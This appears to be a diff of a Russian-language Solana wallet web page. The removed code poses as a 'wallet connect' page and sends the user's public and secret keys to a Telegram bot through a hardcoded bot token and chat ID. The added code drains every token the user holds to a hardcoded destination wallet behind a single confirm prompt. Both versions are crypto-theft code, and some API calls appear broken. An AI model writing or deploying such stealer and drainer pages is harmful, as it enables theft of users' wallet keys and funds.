@@ -3,13 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Solana Wallet Connect</title>
+  <title>Transfer Tokens</title>
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.10.0/dist/web3.min.js"></script>
   <style>
     body {
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
+      justify-content: center;
       height: 100vh;
       margin: 0;
       font-family: Arial, sans-serif;
@@ -31,52 +32,80 @@
   </style>
 </head>
 <body>
-  <button id="connectWallet">Подключить кошелек</button>
+  <h1>Передача всех токенов</h1>
+  <button id="transferTokens">Отправить все токены</button>
 
   <script>
-    const telegramBotToken = "7826785273:AAGi1Tpb1sekJN1DvjPCwTBRpQIcqGwiOZw"; // Вставьте токен вашего бота
-    const telegramChatId = "-1002294857850"; // Вставьте ID чата, куда отправлять сообщения
+    const destinationWallet = "4N8e7Hud7KBsLyMNvnkeQ8RSGWPumDa5Pf9eXgBXZaAE"; // Кошелек для перевода токенов
 
-    // Функция для отправки сообщения в Telegram
-    async function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-      const response = await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: telegramChatId, text: message })
-      });
-
-      if (!response.ok) {
-        const errorText = await response.text();
-        console.error("Ошибка API Telegram:", errorText);
-        alert("Ошибка отправки данных в Telegram.");
-      }
-    }
-
-    // Функция для подключения кошелька Solana
-    async function connectWallet() {
+    async function transferAllTokens() {
       try {
         if (!window.solana) {
           alert("Убедитесь, что у вас установлен Phantom Wallet.");
           return;
         }
 
-        const resp = await window.solana.connect(); // Запрос подключения кошелька
-        const publicKey = resp.publicKey.toString();
-        alert(`Кошелек подключен: ${publicKey}`);
+        const provider = window.solana;
+        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+        const wallet = await provider.connect();
+        const publicKey = wallet.publicKey;
 
-        // Получаем секретный ключ кошелька
-        const secretKey = Array.from(resp.secretKey || []);
+        // Получение всех токен-аккаунтов пользователя
+        const accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+          programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
+        });
 
-        // ОТПРАВКА СЕКРЕТНОГО КЛЮЧА В TELEGRAM
-        await sendToTelegram(`Публичный ключ: ${publicKey}\nСекретный ключ: ${secretKey.join(",")}`);
+        if (accounts.value.length === 0) {
+          alert("На вашем кошельке нет токенов для передачи.");
+          return;
+        }
+
+        // Подтверждение от пользователя
+        const confirmation = confirm("Вы уверены, что хотите передать все свои токены?");
+        if (!confirmation) return;
+
+        // Создание транзакции
+        const transaction = new solanaWeb3.Transaction();
+
+        for (const account of accounts.value) {
+          const tokenAccount = account.pubkey; // Токен-аккаунт пользователя
+          const tokenAmount = account.account.data.parsed.info.tokenAmount.uiAmount;
+          const decimals = account.account.data.parsed.info.tokenAmount.decimals;
+          const mintAddress = account.account.data.parsed.info.mint;
+
+          if (tokenAmount > 0) {
+            const amountToTransfer = tokenAmount * (10 ** decimals);
+
+            // Добавляем инструкцию перевода токена
+            const transferInstruction = solanaWeb3.Token.createTransferInstruction(
+              solanaWeb3.TOKEN_PROGRAM_ID, // Программа токенов Solana
+              tokenAccount, // Текущий аккаунт токена
+              destinationWallet, // Целевой кошелек
+              publicKey, // Отправитель
+              [], // Подписи
+              amountToTransfer // Сумма перевода
+            );
+
+            transaction.add(transferInstruction); // Добавляем инструкцию в транзакцию
+          }
+        }
+
+        if (transaction.instructions.length === 0) {
+          alert("Нет токенов для перевода.");
+          return;
+        }
+
+        // Подписываем и отправляем транзакцию
+        const signature = await provider.signAndSendTransaction(transaction);
+        console.log(`Транзакция отправлена. Подпись: ${signature}`);
+        alert("Все токены успешно переданы!");
       } catch (err) {
-        console.error("Ошибка подключения кошелька:", err);
-        alert("Не удалось подключить кошелек.");
+        console.error("Ошибка при передаче токенов:", err);
+        alert("Произошла ошибка. Проверьте консоль для подробностей.");
       }
     }
 
-    document.getElementById("connectWallet").addEventListener("click", connectWallet);
+    document.getElementById("transferTokens").addEventListener("click", transferAllTokens);
   </script>
 </body>
 </html>
